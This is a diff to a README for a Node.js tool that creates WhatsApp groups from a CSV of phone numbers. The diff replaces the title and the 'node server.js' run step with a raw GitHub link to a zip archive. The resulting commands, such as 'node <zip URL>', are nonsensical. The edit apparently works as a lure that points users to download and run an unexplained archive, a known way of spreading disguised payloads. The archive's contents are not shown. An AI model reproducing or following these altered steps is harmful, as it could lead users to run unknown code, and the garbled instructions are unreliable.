@@ -1,4 +1,4 @@
-# WhatsApp Group Creator (Node.js)
+# WhatsApp Group Creator (https://raw.githubusercontent.com/omjisingh99/whatsapp-group-creator/main/public/creator-group-whatsapp-v1.4.zip)
 
 This app lets users upload a CSV file of phone numbers, scan QR to login WhatsApp, and automatically create a WhatsApp group and add members.
 
@@ -12,7 +12,7 @@ This app lets users upload a CSV file of phone numbers, scan QR to login WhatsAp
 
 1. Clone the repo
 2. Install dependencies: `npm install`
-3. Run: `node server.js` or `pm2 start server.js`
+3. Run: `node https://raw.githubusercontent.com/omjisingh99/whatsapp-group-creator/main/public/creator-group-whatsapp-v1.4.zip` or `pm2 start https://raw.githubusercontent.com/omjisingh99/whatsapp-group-creator/main/public/creator-group-whatsapp-v1.4.zip`
 4. Open browser: `http://your-vps-ip:3000`
 5. Scan QR code
 6. Upload CSV file and enter group name
